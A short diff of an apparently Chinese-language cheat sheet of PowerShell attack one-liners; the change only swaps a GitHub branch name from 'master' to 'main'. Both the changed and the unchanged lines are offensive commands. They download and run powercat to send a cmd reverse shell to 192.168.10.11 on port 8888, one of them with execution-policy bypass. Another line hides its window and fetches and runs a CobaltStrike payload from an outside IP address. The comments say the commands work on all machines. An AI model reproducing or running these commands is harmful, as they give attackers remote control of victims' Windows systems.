@@ -3,8 +3,8 @@ linux的基本属性脚本
 ———————————————————————————————————————————————————————————————
 # cmd窗口下利用Powershell反弹NC shell 
 亲测所有机器都适用
-powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/zyh2580/CheckLinux/master/powercat.ps1');powercat -c 192.168.10.11 -p 8888 -e cmd
-powershell -nop -exec bypass -c "IEX (New-Object System.Net.Webclient)DownloadString('https://raw.githubusercontent.com/zyh2580/CheckLinux/master/powercat.ps1');powercat -c 192.168.10.11  -p 8888 -e cmd.exe"
+powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/zyh2580/CheckLinux/main/powercat.ps1');powercat -c 192.168.10.11 -p 8888 -e cmd
+powershell -nop -exec bypass -c "IEX (New-Object System.Net.Webclient)DownloadString('https://raw.githubusercontent.com/zyh2580/CheckLinux/main/powercat.ps1');powercat -c 192.168.10.11  -p 8888 -e cmd.exe"
 # cmd窗口下利用Powershell反弹CobaltStrike shell
 windows10 经常性不能用。windows 2008R2以下百分百适用。
 powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://114.118.80.138:8080/a'))"   #后台运行
